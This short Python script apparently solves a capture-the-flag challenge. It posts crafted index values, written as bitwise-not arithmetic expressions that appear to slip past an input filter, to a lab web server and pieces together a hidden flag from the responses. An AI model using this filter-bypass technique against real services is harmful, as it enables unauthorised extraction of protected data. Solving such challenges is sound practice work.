import requests

url = "http://172.27.166.125:5000/"
chars = ""
index = [
    '0', 
    '1', 
    '2', 
    '3', 
    '4', 
    '5', 
    '-~5', 
    '-(~0+~5)', 
    '-(~0+~0+~5)', 
    '-(~0+~0+~0+~5)', 
    '(~0+~0)*~4', 
    '-~0+(~0+~0)*~4',
    '(~0+~0)*~5',
    '-~0+(~0+~0)*~5',
    '~0+~0+~0+~0+~4',
    '~0+~0+~0+~4',
    '~0+~0+~4',
    '~0+~4',
    '~4',
    '-4',
    '-3',
    '-2',
    '-1'
]
for i in index:
    data = {"type": "FL4G", "number": "{}".format(i)}
    r = requests.post(url, data=data)
    chars += r.text.split("</strong>")[2].split("</div>")[0]
    
print(chars)